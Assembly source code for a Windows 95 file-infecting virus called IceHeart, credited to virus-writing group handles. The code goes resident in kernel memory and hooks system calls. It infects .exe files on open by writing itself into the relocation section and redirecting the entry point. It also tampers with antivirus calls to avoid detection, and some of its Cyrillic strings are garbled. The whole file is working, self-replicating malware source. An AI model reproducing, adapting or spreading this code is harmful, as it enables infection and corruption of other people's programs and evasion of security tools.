;last review 29.06.1999

;"Ч?о н? ??он? - ??? л?д..."
;Win95.IceHeart v1.5
;(c) 1998-xxxx Stainless Steel Rat /2Rats /RVA /IkX
jumps
.386
.model flat,stdcall

extrn		 ExitProcess:PROC
.code
start:
_start:
	cld
	call _Next
_Next:
	pop esi
	sub esi,offset _Next
	push ebp
	cmp byte ptr [esp+3+4],0BFh
	jne _ExitNow;NT
	mov ebp,_krnl_begin+178h+0Ch-40
_DoSearchSection:
	add ebp,40
	mov edx,[ebp];first rva
	test edx,edx
	jz _ExitNow
	cmp dword ptr [ebp+24h-0Ch],0D0000040h;attr
	jne _DoSearchSection
	mov eax,[ebp+0Ch+40-0Ch];second rva
	mov ebx,eax
	sub eax,edx;rva delta
	sub eax,[ebp+8-0Ch];virtual size
	cmp ah,(virlen_in_mem/256)+1
	jb _DoSearchSection
        ;in ebx second rva
	;in edx virtual size
_SectionForUs:
	sub ebx,eax
	lea edi,[_krnl_begin+ebx]

	lea ebp,[edi+offset _SecondStart-offset _start]
	pusha
	lea esi,[esi+offset _start]

_ResidencyCheck:
	xor ecx,ecx
	cmp byte ptr [edi],cl
	jne _ExitNow2
	mov ch,(virlen_in_mem/256)+1
	rep movsb
	call ebp
_ExitNow2:
	popa
_ExitNow:
	pop ebp
	jmp dword ptr [offset _old_eip+esi]

_SecondStart:
	mov esi,dword ptr ds:[_krnl_begin+_1st_export+0Ah]
	sub ebp,offset _SecondStart
	lea edi,[offset _old_vxd_call+ebp]
	push esi
	movsd
	movsw
	lea eax,[ebp+offset _Handler]
	pop edi
	stosd
	mov ax,cs
	stosw
_InitSomeVars:
	mov dword ptr [offset _RelocFix+ebp+1],ebp
	lea eax,[offset _old_vxd_call+ebp]
	mov dword ptr [ebp+offset _JmpFword+2],eax
	retn

_Handler:
	pusha
_RelocFix:
	mov ebp,11223344h
_CheckBusyFlag:
	lea ecx,[offset _busy_flag+ebp]
	xor edx,edx
	cmp byte ptr [ecx],dl
	jne _Exit_Handler
	mov dl,0C0h
	cmp eax,2A0040h;id of DeviceIoControl
	jne _CheckInt21Call
_CheckAvpCalls:
	cmp word ptr [edx+esp+2],22h
	jne _Exit_Handler
	not dword ptr [edx+esp];i think, avp likes api code,like this ;)
	
_CheckInt21Call:
	cmp eax,2A0010h;calling int 21h ?
	jne _Exit_Handler
	cmp word ptr [esp+44],716Ch;openfile ?
	je _Infect_It

_Exit_Handler:
	popa
_JmpFword:
	jmp fword ptr ds:[offset _old_vxd_call]

_Infect_It:
	
	not byte ptr [ecx]
	mov edi,esi
	xor eax,eax
	cld
	push ecx
	
	push eax

	mov ecx,esp
	repnz scasb
	pop ecx

	mov eax,dword ptr [edi-5]
	or eax,20202000h
	cmp eax,'exe.'
;	cmp eax,'eci.'
	

	jne _ExitInfector
_InfectFile:
	xor byte ptr [offset _Name+4+ebp],13
	
_AllocStack:
	mov ch,4;1024
	sub esp,ecx
	push ecx
_OpenFile:
	xor edi,edi
	xor eax,eax
	cdq

	inc edx
	mov ebx,edx
	inc ebx
	mov ax,716Ch
	call _Int21h
	xchg eax,ebx
	jc _FreeStack
	mov ah,3Fh
	call _Process_1024b
	cmp ecx,eax
	jne _CloseJmp
	mov eax,[edi+3Ch]
	shr ecx,1
	cmp eax,ecx
	jae _CloseJmp
	add edi,eax
	mov eax,[edi]
	inc eax;heuristics sucks
	cmp ax,'EP'+1;sign
	jne _CloseJmp
	cmp byte ptr [edi+61h],7Dh;winzip's sfx stack size
	je _CloseJmp
_CheckAlreadyInfected:


	cmp byte ptr [edi+1Ah],al
	je _CloseJmp
	mov byte ptr [edi+1Ah],al
	test byte ptr [edi+23],22h;dll or fixed image
	jne _CloseJmp
	mov byte ptr [edi+23],0;strip reloc
	mov edx,dword ptr [edi+160];fixup section
	test edx,edx
	je _CloseJmp
	push edx
	xchg dword ptr [edi+40],edx;entry point
	add edx,dword ptr [edi+48+4];image base
	mov dword ptr [offset _old_eip+ebp],edx
	pop edx

_AnalyzePlaceInFixupArea:

	mov ecx,[edi+6]
	lea esi,[edi+0F8h+12];rva

_DoAnalyzeSections:
	lodsd
	cmp eax,edx;search section with rva=fixup rva
	je _OkiFixupOur
	add esi,40-4
	loop _DoAnalyzeSections
_CloseJmp:
	jmp _Close
_OkiFixupOur:
	lodsd;phys size
	mov edx,virlen
	cmp eax,edx
	jb _CloseJmp
	mov dword ptr [esi-12],edx
	push edx
	lodsd;phyz ofs


_Int21CallOptimization:
        lea esi,[ebp+offset _Int21h]
	

_SeekToEnd:

	push eax
	pop dx
	pop cx
	mov ax,4200h
	call esi

_WriteSelf:
	mov ah,40h
	lea edx,[ebp+offset _start]
	pop ecx
	call esi

_WriteHeader:
	xor eax,eax
	mov ah,42h
	cdq
	call esi

	mov ah,40h
	call _Process_1024b

_Close:
	mov ah,3Eh
	call _Int21h

_FreeStack:
	pop ecx
	add esp,ecx

_ExitInfector:
	pop ecx
	not byte ptr [ecx]
	jmp _Exit_Handler


_Process_1024b:
	lea edi,[esp+4+4]
	xor ecx,ecx
	mov ch,4;1024
	mov edx,edi
_Int21h:
	push ecx
	push ebp
	push ecx eax
	push 2A0010h
	mov ebp,_krnl_begin+_1st_export
	call ebp
	pop ebp
	pop ecx
	retn




_Name	db 'Win95.iCE-hEART',0
_Msg	db '? ? ?? , ? ???? ??з?мно л??л? !',0

_old_eip      dd offset ExitProcess
virlen equ $-offset start
_old_vxd_call db 6 dup ('')
_busy_flag    db ''
virlen_in_mem equ $-offset start

ends

.data
		 db 13,10

_krnl_begin equ 0BFF70000h
_1st_export equ 13D4h
end start








